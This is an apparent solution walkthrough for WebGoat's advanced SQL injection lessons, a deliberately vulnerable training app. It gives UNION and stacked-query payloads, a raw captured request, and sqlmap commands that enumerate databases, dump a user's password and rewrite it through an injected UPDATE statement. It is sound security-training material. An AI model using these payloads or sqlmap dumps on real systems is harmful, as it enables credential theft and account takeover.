# (A1) SQL Injection (advanced)

## Lesson #3 - Try It! Pulling data from other tables
Retrieve all data from `user_system_data`
```sql
CREATE TABLE user_data (userid int not null,
                        first_name varchar(20),
                        last_name varchar(20),
                        cc_number varchar(30),
                        cc_type varchar(10),
                        cookie varchar(20),
                        login_count int);

CREATE TABLE user_system_data (userid int not null primary key,
			                   user_name varchar(12),
			                   password varchar(10),
			                   cookie varchar(30));
```

---
### Solution 1 - Using UNION
```
' UNION SELECT userid, user_name, password, cookie, null, null, null FROM user_system_data -- 

==> Your query was: SELECT * FROM user_data WHERE last_name = '' UNION SELECT userid, user_name, password, cookie, null, null, null FROM user_system_data -- '
```

### Solution 2 - Using new SQL statement
```
'; SELECT userid, user_name, password, cookie, null, null, null FROM user_system_data -- 

==> Your query was: SELECT * FROM user_data WHERE last_name = ''; SELECT userid, user_name, password, cookie, null, null, null FROM user_system_data -- ' 
```

## Lesson #5
Can you login as Tom?

---

SQL injection vulnerability is in _Username_ field in the register form.
Registering username `Tom'` returns `"output" : "Something went wrong"`:
```
PUT http://localhost:8080/WebGoat/SqlInjectionAdvanced/challenge
username_reg=Tom'&email_reg=...

==> ERROR
{
  "lessonCompleted" : false,
  "feedback" : "Sorry the solution is not correct, please try again.",
  "output" : "Something went wrong"
}
``` 

Also, usernames such as `Tom' AND '1'='1` or `Tom' AND '2'='2` returns:
```
{
  "lessonCompleted" : false,
  "feedback" : "User Tom' AND '2'='2 already exists please try to register with a different username.",
  "output" : null
}
```

This hint us there's most likely a check before the user is inserted:
```sql
SELECT 1 FROM users WHERE username = [USERNAME];
```

### Step 1 - Diagnostics
Capture a raw single registration request (I used [OWASP ZAP](https://owasp.org/www-project-zap/))
and save it to a file [reg-request.txt](data/01-sqli/reg-request.txt):
```
PUT http://localhost:8080/WebGoat/SqlInjectionAdvanced/challenge HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: */*
Accept-Language: cs,sk;q=0.8,en-US;q=0.5,en;q=0.3
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 83
Origin: http://localhost:8080
Connection: keep-alive
Referer: http://localhost:8080/WebGoat/start.mvc
Cookie: JSESSIONID=neMKsCycQsJqGIPSavkwFwmbrF_0bNIambqrtrt5
Host: localhost:8080

username_reg=Tom&email_reg=qqq%40foo.bar&password_reg=qqq&confirm_password_reg=qqq
```

Let' see if [sqlmap](http://sqlmap.org/) can find some vulnerabilities:
```
$ sqlmap -r data/01-sqli/reg-request.txt
..
POST parameter 'username_reg' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 51 HTTP(s) requests:
---
Parameter: username_reg (PUT)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: username_reg=Tom' AND 5565=5565 AND 'dHUn'='dHUn&email_reg=qqq@foo.bar&password_reg=qqq&confirm_password_reg=qqq

    Type: stacked queries
    Title: HSQLDB >= 1.7.2 stacked queries (heavy query - comment)
    Payload: username_reg=Tom';CALL REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(9374),0),500000000),NULL)--&email_reg=qqq@foo.bar&password_reg=qqq&confirm_password_reg=qqq

    Type: AND/OR time-based blind
    Title: HSQLDB > 2.0 AND time-based blind (heavy query)
    Payload: username_reg=Tom' AND CHAR(121)||CHAR(78)||CHAR(82)||CHAR(65)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),500000000),NULL) AND 'tHuZ'='tHuZ&email_reg=qqq@foo.bar&password_reg=qqq&confirm_password_reg=qqq
```

Good, we found [boolean-based blind](https://github.com/sqlmapproject/sqlmap/wiki/Techniques)
SQL injection vulnerability.

Since we don't know the name of the _users_ table, let's start with enumerating all databases.

### Step 2 - Enumerate all databases

Run _sqlmap_ with `--dbs` to enumerate all databases:
```
$ sqlmap -r data/01-sqli/reg-request.txt -p username_reg -v 1 --dbs
# Run first without --no-cast to get total number of databases

$ sqlmap -r data/01-sqli/reg-request.txt -p username_reg -v 1 --dbs --no-cast
..
available databases [5]:
[*] CONTAINER
[*] container
[*] INFORMATION_SCHEMA
[*] PUBLIC
[*] SYSTEM_LOBS
```
See [sqlmap usage](https://github.com/sqlmapproject/sqlmap/wiki/Usage) to understand all parameters.
Adding `--no-cast` was a result of trial & error.

Ok, let's look what's inside `PUBLIC` database.

### Step 3 - Enumerate tables in PUBLIC database

Run _sqlmap_ with `--D PUBLIC --tables` to enumerate all tables in `PUBLIC` database:
```
$ sqlmap -r data/01-sqli/reg-request.txt -p username_reg -v 1 -D PUBLIC --tables
# Run first without --no-escape to get total number of tables

$ sqlmap -r data/01-sqli/reg-request.txt -p username_reg -v 1 -D PUBLIC --tables --no-escape
..
Database: PUBLIC
[10 tables]
+-----------------------+
| CHALLENGE_USERS       |
| EMPLOYEES             |
| JWT_KEYS              |
| SALARIES              |
| SERVERS               |
| SQL_CHALLENGE_USERS   |
| USER_DATA             |
| USER_DATA_TAN         |
| USER_SYSTEM_DATA      |
| flyway_schema_history |
+-----------------------+
```
Adding `--no-escape` was a result of trial & error.

Nice, finally, let's dump `SQL_CHALLENGE_USERS`.

### Step 4a - Dump SQL_CHALLENGE_USERS
```
$ sqlmap -r data/01-sqli/reg-request.txt -p username_reg -v 1 -D PUBLIC -T SQL_CHALLENGE_USERS --dump --where "USERID='tom'" --no-escape
..
+--------+-----------------+-------------------------+
| USERID | EMAIL           | PASSWORD                |
+--------+-----------------+-------------------------+
| tom    | tom@webgoat.org | thisisasecretfortomonly |
+--------+-----------------+-------------------------+
```

And the password is `thisisasecretfortomonly`

### Step 4b - Change Tom's password

Dump `SQL_CHALLENGE_USERS` columns:
```
$ sqlmap -r data/01-sqli/reg-request.txt -p username_reg -v 1 -D PUBLIC -T SQL_CHALLENGE_USERS --columns
Database: PUBLIC
Table: SQL_CHALLENGE_USERS
[3 columns]
+----------+----------+
| Column   | Type     |
+----------+----------+
| EMAIL    | EMAIL    |
| PASSWORD | PASSWORD |
| USERID   | USERID   |
+----------+----------+
```

Register a new user with the following username:
```
Tom'; UPDATE SQL_CHALLENGE_USERS set PASSWORD = 'hello555' WHERE USERID = 'tom'; --
```

Tom's password is `hello555` now.